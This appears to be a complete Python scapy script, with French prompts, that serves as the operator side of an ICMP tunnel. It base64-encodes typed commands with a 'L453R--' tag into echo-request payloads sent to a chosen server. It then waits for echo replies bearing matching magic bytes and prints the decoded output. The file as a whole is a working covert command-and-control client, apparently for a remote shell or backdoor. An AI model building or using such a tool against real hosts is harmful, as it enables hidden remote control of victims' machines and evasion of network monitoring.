#!/usr/bin/python3
import sys
import base64
from scapy.all import *


print("veuillez entrer l'adresse du serveur: ", end='', flush=True)
ip=input()
while True:
  print('\033[36m' + "à nous: " + '\033[0m' ,end='',flush=True)
  userinput=input()
  userinput="L453R--" + userinput
  userinput=userinput.encode('utf-8')
  b64_bytes = base64.b64encode(userinput)
  b64_message = b64_bytes.decode('utf-8')
  send(IP(dst=ip)/ICMP(type=8)/Raw(str(b64_message)),verbose=0)
  packet=sniff(filter="icmp[icmptype]==icmp-echoreply and icmp[8:4]==0x54445131 and icmp[12:2]==0x4d31",count=1)

  message=packet[0][Raw].load
  message=message.decode('utf-8')
  message=base64.b64decode(message)
  message=message.decode('utf-8')
  message=message.split('--')[1]
  print('\033[32m' + message + '\033[0m')
